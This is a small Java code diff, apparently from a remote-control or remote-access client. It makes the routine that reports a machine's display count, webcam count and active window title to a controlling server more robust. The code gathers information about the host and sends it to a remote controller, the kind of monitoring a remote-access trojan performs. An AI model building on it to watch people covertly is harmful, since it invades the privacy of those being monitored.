@@ -31,9 +31,17 @@ public class ClientControlComponents {
     }
 
     public static void sendBasicInfo() {
+        int displays = 0;
+        int webcams = 0;
         try {
             SystemInfo si = new SystemInfo();
-            ConnectClient.msg("updateinfo " + si.getHardware().getDisplays().size() + " " + Webcam.getWebcams().size() + " " + getActiveWindowTitle());
+            displays = si.getHardware().getDisplays().size();
+        } catch (Exception ignored) {}
+        try {
+            webcams = Webcam.getWebcams().size();
+        } catch (Exception ignored) {}
+        try {
+            ConnectClient.msg("updateinfo " + displays + " " + webcams + " " + getActiveWindowTitle());
         } catch (Exception ignored) {
             ConnectClient.msg("updateinfo 0 0 " + getActiveWindowTitle());
         }
